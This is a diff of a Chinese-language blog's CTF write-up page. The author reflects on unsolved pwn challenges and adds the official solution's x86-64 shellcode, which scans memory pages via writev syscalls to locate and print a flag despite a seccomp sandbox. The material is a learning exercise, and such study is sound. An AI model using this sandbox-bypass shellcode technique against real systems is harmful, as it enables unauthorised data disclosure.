@@ -398,14 +398,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 
@@ -456,15 +456,47 @@
 <li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li>
 <li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul>
 <li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li>
-<li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（求问这个操作能实现吗？感觉理论上是可以的啊？求指点一下）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li>
-<li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3>学长说这个输出不了是文件描述符和参数布置的问题，查阅man手册等后修改多次也未成功，求指点<br><img src="https://i.niupic.com/images/2022/10/17/a9tu.png"></li>
+<li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li>
+</ul>
+</li>
+</ul>
+<h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">sc <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+lea rsp, [rip+0x500]
+lea r13, [rip]
+mov r14, 0xfffffff00000 
+and r13, r14 # 使r13页对齐
+loop:
+	add r13, 0x1000
+	pop r14 #回收上一次push的r13地址
+	pop r14
+	push 0x1 #唯一没搞懂就是这个1有啥用
+	push r13
+	mov rdi, 2
+	mov rsi, rsp
+	mov rdx, 1
+	mov rcx, 0
+	mov rax, 20
+	syscall
+	cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读
+	jl loop # 若不可读再次循环
+mov rdi, [r13]
+cmp edi, 0x54435354 #判断字符串是否以TSCT开头
+jnz loop
+push 31
+push r13
+mov rdi, 2
+mov rsi, rsp
+mov rdx, 1
+mov rcx, 0
+mov rax, 20
+syscall #打印flag
+jmp $
+"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3>  这个地方的文件描述符错误应该是2，系统调用可用writev<br><img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><ul>
 <li><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2>其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</li>
 </ul>
 </li>
-</ul>
-</li>
-<li><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><ul>
-<li><h2 id="Just-Play"><a href="#Just-Play" class="headerlink" title="Just_Play"></a>Just_Play</h2>先是纯玩儿,后来觉得刷钱太慢了，RPG MAKER改了下存档数据，鼠鼠的英语口音很好我很喜欢( part2找半天找不到，以为在高塔中间，硬爬10分钟啥也没有</li>
 </ul>
 </li>
 <li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li>
@@ -901,7 +933,7 @@ gitment.render('gitment-content');
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">1k</span>
+                        class="white-color">1.1k</span>
             
             
             
